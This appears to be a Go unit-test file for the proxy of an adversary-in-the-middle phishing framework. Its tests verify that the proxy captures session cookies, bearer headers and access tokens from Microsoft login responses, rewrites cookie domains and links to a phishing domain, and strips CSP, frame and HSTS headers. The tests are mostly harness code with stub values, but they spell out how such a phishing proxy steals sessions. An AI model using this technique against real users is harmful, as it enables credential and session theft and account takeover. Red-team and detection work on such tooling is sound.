package proxy

import (
	"io"
	"net/http"
	"regexp"
	"strings"
	"testing"

	"github.com/travisbale/mirage/internal/aitm"
)

// ── token extraction ─────────────────────────────────────────────────────────

func TestExtractTokens_CookieCapture(t *testing.T) {
	c := testConn(configured(&aitm.Phishlet{
		AuthTokens: []aitm.TokenRule{
			{Type: aitm.TokenTypeCookie, Name: regexp.MustCompile(`^authToken$`)},
		},
	}), &aitm.Session{ID: "s1"})
	c.server.SessionSvc = &stubSessionSvc{}

	resp := testResp(http.StatusOK, "text/html", "")
	resp.Header.Add("Set-Cookie", "authToken=secret; Domain=login.microsoft.com; Path=/")

	c.extractTokens(resp)

	if _, ok := c.session.CookieTokens["login.microsoft.com"]["authToken"]; !ok {
		t.Errorf("expected authToken captured, got: %v", c.session.CookieTokens)
	}
}

func TestExtractTokens_HeaderCapture(t *testing.T) {
	c := testConn(configured(&aitm.Phishlet{
		AuthTokens: []aitm.TokenRule{
			{Type: aitm.TokenTypeHTTPHeader, Name: regexp.MustCompile(`^X-Auth-Token$`), Search: regexp.MustCompile(`Bearer (.+)`)},
		},
	}), &aitm.Session{ID: "s1"})
	c.server.SessionSvc = &stubSessionSvc{}

	resp := testResp(http.StatusOK, "application/json", `{"ok":true}`)
	resp.Header.Set("X-Auth-Token", "Bearer abc123")

	c.extractTokens(resp)

	if got := c.session.HTTPTokens["X-Auth-Token"]; got != "abc123" {
		t.Errorf("HTTPTokens[X-Auth-Token] = %q, want %q", got, "abc123")
	}
}

func TestExtractTokens_BodyCapture(t *testing.T) {
	c := testConn(configured(&aitm.Phishlet{
		AuthTokens: []aitm.TokenRule{
			{Type: aitm.TokenTypeBody, Name: regexp.MustCompile(`access_token`), Search: regexp.MustCompile(`"access_token"\s*:\s*"([^"]+)"`)},
		},
	}), &aitm.Session{ID: "s1"})
	c.server.SessionSvc = &stubSessionSvc{}

	resp := testResp(http.StatusOK, "application/json", `{"access_token":"tok_abc123"}`)

	c.extractTokens(resp)

	if got := c.session.BodyTokens["access_token"]; got != "tok_abc123" {
		t.Errorf("BodyTokens[access_token] = %q, want %q", got, "tok_abc123")
	}
}

// ── cookie rewriting ─────────────────────────────────────────────────────────

func TestRewriteCookies_DomainRewrite(t *testing.T) {
	c := testConn(configured(
		&aitm.Phishlet{
			ProxyHosts: []aitm.ProxyHost{
				{PhishSubdomain: "login", OrigSubdomain: "login", Domain: "microsoft.com"},
			},
		},
		&aitm.PhishletConfig{BaseDomain: "phish.example.com"},
	), &aitm.Session{ID: "s1"})

	resp := testResp(http.StatusOK, "text/html", "")
	resp.Header.Set("Set-Cookie", "session=abc123; Domain=login.microsoft.com; Path=/; Secure")
	c.rewriteCookies(resp)

	setCookie := resp.Header.Get("Set-Cookie")
	if !strings.Contains(setCookie, "phish.example.com") {
		t.Errorf("expected cookie domain rewritten to phish.example.com, got: %s", setCookie)
	}
}

func TestRewriteCookies_MultiHost_SessionCookieDomain(t *testing.T) {
	c := testConn(configured(
		&aitm.Phishlet{
			ProxyHosts: []aitm.ProxyHost{
				{PhishSubdomain: "login"},
				{PhishSubdomain: "api"},
			},
		},
		&aitm.PhishletConfig{BaseDomain: "phish.local"},
	), &aitm.Session{ID: "s1"})
	c.isNewSession = true

	resp := testResp(http.StatusOK, "text/html", "")
	c.rewriteCookies(resp)

	for _, v := range resp.Header.Values("Set-Cookie") {
		if strings.Contains(v, "__ss=s1") {
			if !strings.Contains(v, "Domain=phish.local") {
				t.Errorf("expected __ss domain=phish.local for multi-host, got: %s", v)
			}
			return
		}
	}
	t.Error("expected __ss cookie to be injected")
}

// ── sub filter ───────────────────────────────────────────────────────────────

func TestApplySubFilters_AutoFilter(t *testing.T) {
	c := testConn(configured(
		&aitm.Phishlet{
			ProxyHosts: []aitm.ProxyHost{
				{PhishSubdomain: "login", OrigSubdomain: "login", Domain: "target.local", UpstreamScheme: "http", AutoFilter: true},
			},
		},
		&aitm.PhishletConfig{BaseDomain: "phish.local"},
	), &aitm.Session{ID: "s1"})

	resp := testResp(http.StatusOK, "text/html", `<a href="http://login.target.local/page">link</a>`)

	c.applySubFilters(resp)

	body, _ := io.ReadAll(resp.Body)
	if !strings.Contains(string(body), "login.phish.local") {
		t.Errorf("expected auto_filter rewrite, got: %s", string(body))
	}
}

// ── security header stripping ────────────────────────────────────────────────

func TestStripSecurityHeaders(t *testing.T) {
	c := testConn(configured(&aitm.Phishlet{}), &aitm.Session{ID: "s1"})

	resp := testResp(http.StatusOK, "text/html", "")
	resp.Header.Set("Content-Security-Policy", "default-src 'self'")
	resp.Header.Set("X-Frame-Options", "DENY")
	resp.Header.Set("Strict-Transport-Security", "max-age=31536000")

	c.stripSecurityHeaders(resp)

	for _, header := range securityHeaders {
		if resp.Header.Get(header) != "" {
			t.Errorf("expected %s to be stripped", header)
		}
	}
}
